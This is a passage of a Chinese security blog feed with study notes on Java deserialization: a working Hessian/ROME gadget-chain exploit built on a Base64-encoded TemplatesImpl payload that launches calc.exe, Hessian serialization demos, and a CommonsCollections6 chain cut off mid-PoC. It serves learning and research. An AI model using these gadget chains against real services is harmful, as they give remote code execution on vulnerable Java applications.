class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQALAoABgAeCgAfACAIACEKAB8AIgcAIwcAJAEABjxpbml0PgEAAygpVgEABENvZGUB&quot;</span> +<br>                <span class="hljs-string">&quot;AA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAPTHhzdzZhL0Vp&quot;</span> +<br>                <span class="hljs-string">&quot;dmxUd287AQAKRXhjZXB0aW9ucwcAJQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hl&quot;</span> +<br>                <span class="hljs-string">&quot;L3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJu&quot;</span> +<br>                <span class="hljs-string">&quot;YWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9z&quot;</span> +<br>                <span class="hljs-string">&quot;dW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNv&quot;</span> +<br>                <span class="hljs-string">&quot;bS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFu&quot;</span> +<br>                <span class="hljs-string">&quot;ZGxlcjsHACYBAKYoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007&quot;</span> +<br>                <span class="hljs-string">&quot;TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjtMY29t&quot;</span> +<br>                <span class="hljs-string">&quot;L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5k&quot;</span> +<br>                <span class="hljs-string">&quot;bGVyOylWAQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0v&quot;</span> +<br>                <span class="hljs-string">&quot;RFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRl&quot;</span> +<br>                <span class="hljs-string">&quot;cm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAClNvdXJjZUZpbGUBAAxFaXZs&quot;</span> +<br>                <span class="hljs-string">&quot;VHdvLmphdmEMAAcACAcAJwwAKAApAQAIY2FsYy5leGUMACoAKwEADXhzdzZhL0VpdmxUd28BAEBj&quot;</span> +<br>                <span class="hljs-string">&quot;b20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRy&quot;</span> +<br>                <span class="hljs-string">&quot;YW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9p&quot;</span> +<br>                <span class="hljs-string">&quot;bnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0&quot;</span> +<br>                <span class="hljs-string">&quot;UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJp&quot;</span> +<br>                <span class="hljs-string">&quot;bmc7KUxqYXZhL2xhbmcvUHJvY2VzczsAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAQAACAAEAAAAO&quot;</span> +<br>                <span class="hljs-string">&quot;KrcAAbgAAhIDtgAEV7EAAAACAAoAAAAOAAMAAAAMAAQADQANAA4ACwAAAAwAAQAAAA4ADAANAAAA&quot;</span> +<br>                <span class="hljs-string">&quot;DgAAAAQAAQAPAAEAEAARAAIACQAAAD8AAAADAAAAAbEAAAACAAoAAAAGAAEAAAARAAsAAAAgAAMA&quot;</span> +<br>                <span class="hljs-string">&quot;AAABAAwADQAAAAAAAQASABMAAQAAAAEAFAAVAAIADgAAAAQAAQAWAAEAEAAXAAIACQAAAEkAAAAE&quot;</span> +<br>                <span class="hljs-string">&quot;AAAAAbEAAAACAAoAAAAGAAEAAAAUAAsAAAAqAAQAAAABAAwADQAAAAAAAQASABMAAQAAAAEAGAAZ&quot;</span> +<br>                <span class="hljs-string">&quot;AAIAAAABABoAGwADAA4AAAAEAAEAFgABABwAAAACAB0=&quot;</span>);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodes</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactory</span> <span class="hljs-operator">=</span> aClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        name.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        bytecodes.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;code&#125;);<br>        name.set(templates, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        tfactory.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br><br>        <span class="hljs-type">ToStringBean</span> <span class="hljs-variable">toStringBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ToStringBean</span>(Templates.class, templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-number">1</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException, toStringBean);<br><br><br>        KeyPairGenerator keyPairGenerator;<br>        keyPairGenerator = KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        keyPairGenerator.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">keyPair</span> <span class="hljs-operator">=</span> keyPairGenerator.genKeyPair();<br>        <span class="hljs-type">PrivateKey</span> <span class="hljs-variable">privateKey</span> <span class="hljs-operator">=</span> keyPair.getPrivate();<br>        <span class="hljs-type">Signature</span> <span class="hljs-variable">signingEngine</span> <span class="hljs-operator">=</span> Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">so</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(badAttributeValueExpException, privateKey, signingEngine);<br><br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">delegate</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(SignedObject.class, so);<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, delegate);<br><br><br>        HashMap&lt;Object, Object&gt; map = JDKUtil.makeMap(root, root);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">os</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">output</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(os);<br>        output.writeObject(map);<br><br><br>        <span class="hljs-type">byte</span>[] serializedData = os.toByteArray();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serializedData);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(is);<br>        hi.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Hessian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hessian反序列化</title>
    <link href="/2022/03/28/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2022/03/28/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Hessian反序列化"><a href="#Hessian反序列化" class="headerlink" title="Hessian反序列化"></a>Hessian反序列化</h1><p>之前搭建了很久的Weblogic环境，最后还是没有搭建成功。难受，看了Y4师傅的文章+虎符。来瞧瞧这个新玩意。（<strong>学的比较肤浅</strong>）</p><h2 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age ;<br>    <span class="hljs-keyword">transient</span> String xs;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了get&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了set&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getXs</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> xs;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setXs</span><span class="hljs-params">(String xs)</span> &#123;<br>        <span class="hljs-built_in">this</span>.xs = xs;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age, String xs)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>        <span class="hljs-built_in">this</span>.xs = xs;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>                <span class="hljs-string">&quot;, xs=&#x27;&quot;</span> + xs + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianInput;<br><span class="hljs-keyword">import</span> com.caucho.hessian.io.HessianOutput;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">( String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Twings&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>serialize(data);<br>unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(byteArrayOutputStream);<br>        hessianOutput.writeObject(obj);<br>        byteArrayOutputStream.toByteArray();<br><br>        <span class="hljs-comment">//写入文件</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fileOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>        fileOutputStream.write(byteArrayOutputStream.toByteArray());<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//读取文件</span><br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fileInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename);<br>        <span class="hljs-type">byte</span>[] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[<span class="hljs-number">1024</span>];<br>        <span class="hljs-type">int</span> <span class="hljs-variable">read</span> <span class="hljs-operator">=</span> fileInputStream.read(bytes);<br>        <span class="hljs-comment">//反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">byteArrayInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(byteArrayInputStream);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hi.readObject();<br>        System.out.println(o);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203281134724.png" alt="QQ截图20220328113346"></p><ul><li>transient关键字修饰的属性不能被序列化；</li><li>hessian序列化时，一定要注意子类和父类不能有同名字段。<a href="https://www.jianshu.com/p/6a36dd1fcca8">这里有解释</a>。附上截图。</li></ul><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203281147761.png" alt="QQ截图20220328114008"></p><ul><li>没有调用setter，getter方法。</li></ul><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><p>简单的Hessian反序列化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HessianDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">( String[] args )</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">data</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">&quot;Twings&quot;</span>, <span class="hljs-number">1</span>, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">HessianOutput</span> <span class="hljs-variable">ho</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(bos);<br>        ho.writeObject(data);<br><br><br>        <span class="hljs-type">byte</span>[] serializedData = bos.toByteArray();<br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(serializedData);<br>        <span class="hljs-type">HessianInput</span> <span class="hljs-variable">hi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(is);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> hi.readObject();<br>        System.out.println(o);<br>   &#125;<br></code></pre></td></tr></table></figure><p>对比jdk反序列化来说不一样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HessianOutput</span> <span class="hljs-variable">hessianOutput</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianOutput</span>(byteArrayOutputStream);<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">HessianInput</span> <span class="hljs-variable">hi</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HessianInput</span>(byteArrayInputStream);<br></code></pre></td></tr></table></figure><p>给入口点下个断点调试一下。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301315999.png" alt="QQ截图20220328115553"></p><p>跟进。一步一步调试。在**hessianInput#readObject()<strong>中，发现调用了</strong>readMap(this, type)**。跟进。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301315127.png" alt="QQ截图20220328115815"></p><p>来到<strong>UnsafeDesserialize#readMap()</strong><br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203281205473.png" alt="QQ截图20220328120520"></p><p>进入循环，先调用<code>in.readObject()</code>从输入流中获取属性名称，接着从之前确定好的<code>this._fieldMap</code>中匹配该属性对应的FieldDeserizlizer，然后调用匹配上的FieldDeserializer进行处理。</p><p>后续如果传入的类型是map，那么就可一调用这里。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301315445.png" alt="QQ截图20220329224157"></p><p>我调试了很久（在我们传入hashmap类型的时候就会进入这个带有参数的<code>in.readObject</code>）</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301315372.png" alt="QQ截图20220329225140"></p><p>会在这里进入。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203301315899.png" alt="QQ截图20220329225210"></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>这里一下恍然大悟，跟之前的很多链子都很相似。控制key，调用其hashcode，完成构造链。<br>也就是Y4师傅说这个可以和rome链结合的原因。</p>]]></content>
    
    
    <categories>
      
      <category>Hessian</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections6</title>
    <link href="/2022/03/23/CommonsCollections6/"/>
    <url>/2022/03/23/CommonsCollections6/</url>
    
    <content type="html"><![CDATA[<h1 id="CommonCollection6"><a href="#CommonCollection6" class="headerlink" title="CommonCollection6"></a>CommonCollection6</h1><p>之前懒的继续复习这个。复习完之后才发现我cc5里面写了，但是最近看到很多都是开头就基于cc6来说….emmm。（主要是能打高版本。<strong>在8u71之后，，Java官方修改了 sun.reflect.annotation.AnnotationInvocationHandler 的readObject函数其中的setvalue没有了</strong>）<br>老样子先来看看利用链。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">java.io.ObjectInputStream.readObject()<br>java.util.HashMap.readObject()<br>java.util.HashMap.hash()                 org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()                  org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()                       org.apache.commons.collections.map.LazyMap.get()          org.apache.commons.collections.functors.ChainedTransformer.transform()                      org.apache.commons.collections.functors.InvokerTransformer.transform()<br>java.lang.reflect.Method.invoke()<br>java.lang.Runtime.exec()<br></code></pre></td></tr></table></figure><p>这里还是用到了一些关于cc1的知识。这里先来看一下之前没有见过的。并且这里就是要找寻其他类调用get方法，找到了TiedMapEntry#hashCode()。</p><h2 id="TiedMapEntry-hashCode"><a href="#TiedMapEntry-hashCode" class="headerlink" title="TiedMapEntry#hashCode()"></a>TiedMapEntry#hashCode()</h2><p>调用了getValue()</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232217452.png" alt="QQ截图20220323221741"></p><p>继续往下走。</p><h3 id="TiedMapEntry-getValue"><a href="#TiedMapEntry-getValue" class="headerlink" title="TiedMapEntry#getValue()"></a>TiedMapEntry#getValue()</h3><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232219720.png" alt="QQ截图20220323221855"></p><p>这里调用了get方法。<br>接着回到上面的<strong>hashcode()</strong>,哪里调用了它？自然而然想到<strong>hashmap</strong>，反序列化的时候会计算hashmap中的key的hashcode。</p><h2 id="HashMap-ReadObject"><a href="#HashMap-ReadObject" class="headerlink" title="HashMap#ReadObject()"></a>HashMap#ReadObject()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232345955.png" alt="QQ截图20220323223935"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232345894.png" alt="QQ截图20220323224058"></p><p>这里就不做过多的解释了。<br>这样一个完整的链子就建立了。</p><h2 id="poc（不成功）"><a href="#poc（不成功）" class="headerlink" title="poc（不成功）"></a>poc（不成功）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc6Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, 